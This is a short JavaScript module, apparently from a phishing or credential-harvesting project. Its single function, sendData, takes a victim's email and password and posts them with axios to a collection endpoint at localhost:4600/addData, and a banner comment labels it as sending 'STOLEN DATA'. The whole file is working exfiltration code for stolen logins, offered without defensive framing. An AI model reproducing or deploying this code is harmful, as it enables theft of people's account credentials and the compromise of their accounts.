import axios from 'axios';

// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
// SENDS STOLEN DATA TO API SERVER (ASYNC)
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
export async function sendData(pEmail, pPassword) 
{    
    try 
    {     
        // Axios configuration (include CORS headers) :
        const config = 
        {
            method: 'post',
            url: 'http://localhost:4600/addData',
            headers: {
                "access-control-allow-origin": "*",
                'Access-Control-Allow-Headers': 'Content-Type, Authorization',
                'Access-Control-Allow-Methods': '*',
              },
            withCredentials: false, // default
            data: {
              email: pEmail,
              password: pPassword
            },
            'Content-Type': 'application/json'
        }
        
        var response    = await axios(config);  
        var data        = response.data;
                
        console.log(response);

        return data;        
    }
    catch (error) 
    {
        console.error(error);
    }
}